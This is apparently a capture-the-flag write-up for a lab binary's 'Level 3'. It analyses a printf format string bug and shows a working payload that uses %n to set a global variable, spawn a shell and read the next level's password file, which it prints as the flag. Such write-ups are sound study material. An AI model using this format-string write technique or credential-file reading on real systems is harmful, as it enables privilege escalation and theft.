# Level 3

Same recon as level0: SUID **level4**.

## Analysis

```c
int m;                               // global

void v(void) {
    char local_20c[520];
    fgets(local_20c, 0x200, stdin);
    printf(local_20c);               // format string vulnerability
    if (m == 0x40)                   // need m == 64
        system("/bin/sh");
}
void main(void) { v(); }
```

`fgets` is bounded, so no overflow. The bug is `printf(local_20c)`: our input is used as the [format string](../knowledge_base/format_string.md). The shell runs only if the global `m == 0x40` (64), so we use the format string to write 64 into `m`.

`m`'s address comes from the disassembly:

```asm
mov    0x804988c,%eax       ; load m
cmp    $0x40,%eax           ; compare with 64
```

So `m` is at `0x0804988c`.

## Exploit

### Where our input lands on printf's stack

`printf` has no real arguments, so each `%x` prints a word already on the stack. Find where our input sits:

```
$ ./level3
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141
```

`41414141` ("AAAA") is the 4th word, so our buffer is at **position 4**. `%4$x` reaches it directly (the `%N$` syntax picks the Nth argument):

```
$ ./level3
AAAA %4$x
AAAA 41414141
```

### Write 64 into m

[`%n`](../knowledge_base/format_string.md#writing-to-memory-n) writes the number of bytes printed so far to the address held by its argument. Put `m`'s address at position 4, print exactly 64 bytes, then `%4$n`:

```
[ &m: 4 bytes ][ %60x ][ %4$n ]
```

- the 4 address bytes count as 4 printed chars,
- `%60x` adds 60 more → 64 total,
- `%4$n` writes 64 to the address at position 4 (which is `&m`).

### Run

```bash
$ (python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4\$n')"; cat) | ./level3
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

(`\x8c\x98\x04\x08` is `0x0804988c` little-endian. `\$` escapes `$` from the shell inside double quotes.)

The padding does not have to be `%60x`. Any 60 printed bytes work, so plain literal characters are fine here:

```bash
$ (python -c "print('\x8c\x98\x04\x08' + 'a'*60 + '%4\$n')"; cat) | ./level3
```

`%4$n` writes to a fixed position (4), so it does not matter that `%60x` reads a stack value while `a`*60 does not; both print 60 bytes → 64 total. This only works because the count is small. level4 and level5 need tens of thousands or millions of bytes, which you cannot type as literals, so there you must use `%Nx` to make the width with one specifier.

Flag: `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
